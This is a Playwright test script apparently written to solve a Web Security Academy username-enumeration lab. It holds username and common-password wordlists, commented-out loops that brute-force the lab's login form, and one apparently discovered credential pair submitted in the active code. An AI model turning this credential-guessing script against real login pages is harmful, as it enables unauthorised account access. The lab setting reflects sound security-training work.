// @ts-check
import { test, expect } from '@playwright/test';

const usernames = [
  "carlos",
  "root",
  "admin",
  "test",
  "guest",
  "info",
  "adm",
  "mysql",
  "user",
  "administrator",
  "oracle",
  "ftp",
  "pi",
  "puppet",
  "ansible",
  "ec2-user",
  "vagrant",
  "azureuser",
  "academico",
  "acceso",
  "access",
  "accounting",
  "accounts",
  "acid",
  "activestat",
  "ad",
  "adam",
  "adkit",
  "admin",
  "administracion",
  "administrador",
  "administrator",
  "administrators",
  "admins",
  "ads",
  "adserver",
  "adsl",
  "ae",
  "af",
  "affiliate",
  "affiliates",
  "afiliados",
  "ag",
  "agenda",
  "agent",
  "ai",
  "aix",
  "ajax",
  "ak",
  "akamai",
  "al",
  "alabama",
  "alaska",
  "albuquerque",
  "alerts",
  "alpha",
  "alterwind",
  "am",
  "amarillo",
  "americas",
  "an",
  "anaheim",
  "analyzer",
  "announce",
  "announcements",
  "antivirus",
  "ao",
  "ap",
  "apache",
  "apollo",
  "app",
  "app01",
  "app1",
  "apple",
  "application",
  "applications",
  "apps",
  "appserver",
  "aq",
  "ar",
  "archie",
  "arcsight",
  "argentina",
  "arizona",
  "arkansas",
  "arlington",
  "as",
  "as400",
  "asia",
  "asterix",
  "at",
  "athena",
  "atlanta",
  "atlas",
  "att",
  "au",
  "auction",
  "austin",
  "auth",
  "auto",
  "autodiscover"
];

const passwords = [
  "123456",
  "password",
  "12345678",
  "qwerty",
  "123456789",
  "12345",
  "1234",
  "111111",
  "1234567",
  "dragon",
  "123123",
  "baseball",
  "abc123",
  "football",
  "monkey",
  "letmein",
  "shadow",
  "master",
  "666666",
  "qwertyuiop",
  "123321",
  "mustang",
  "1234567890",
  "michael",
  "654321",
  "superman",
  "1qaz2wsx",
  "7777777",
  "121212",
  "000000",
  "qazwsx",
  "123qwe",
  "killer",
  "trustno1",
  "jordan",
  "jennifer",
  "zxcvbnm",
  "asdfgh",
  "hunter",
  "buster",
  "soccer",
  "harley",
  "batman",
  "andrew",
  "tigger",
  "sunshine",
  "iloveyou",
  "2000",
  "charlie",
  "robert",
  "thomas",
  "hockey",
  "ranger",
  "daniel",
  "starwars",
  "klaster",
  "112233",
  "george",
  "computer",
  "michelle",
  "jessica",
  "pepper",
  "1111",
  "zxcvbn",
  "555555",
  "11111111",
  "131313",
  "freedom",
  "777777",
  "pass",
  "maggie",
  "159753",
  "aaaaaa",
  "ginger",
  "princess",
  "joshua",
  "cheese",
  "amanda",
  "summer",
  "love",
  "ashley",
  "nicole",
  "chelsea",
  "biteme",
  "matthew",
  "access",
  "yankees",
  "987654321",
  "dallas",
  "austin",
  "thunder",
  "taylor",
  "matrix",
  "mobilemail",
  "mom",
  "monitor",
  "monitoring",
  "montana",
  "moon",
  "moscow"
]

test('has title', async ({ page }) => {
  await page.goto('https://0a3b00690344865481305dd2009e00c5.web-security-academy.net/login');

  // Expect a title "to contain" a substring.
  await expect(page).toHaveTitle(/enumeration/);
});

test('fill-form', async ({ page }) => {
  test.setTimeout(5 * 60 * 1000);

  await page.goto('https://0a3b00690344865481305dd2009e00c5.web-security-academy.net/login');

  // for (const username of usernames) {

  // for (const password of passwords) {
      
      await page.locator('input[name="username"]').fill("announcements");
      await page.locator('input[name="password"]').fill("chelsea");

      const responsePromise = page.waitForResponse('**/login');

      await page.getByText('Log In').click();

      const response = await responsePromise;

      // console.log(response.text());
      const message = await page.locator('.is-warning').textContent();

      // console.log(username, message);
      // console.log(password, message);
  // }

  // }


  // page.on('request', request => console.log('>>', request.method(), request.url()));
  // page.on('response', response => console.log('<<', response.status(), response.url()));


})

// test('get started link', async ({ page }) => {
//   await page.goto('https://playwright.dev/');

//   // Click the get started link.
//   await page.getByRole('link', { name: 'Get started' }).click();

//   // Expects page to have a heading with the name of Installation.
//   await expect(page.getByRole('heading', { name: 'Installation' })).toBeVisible();
// });
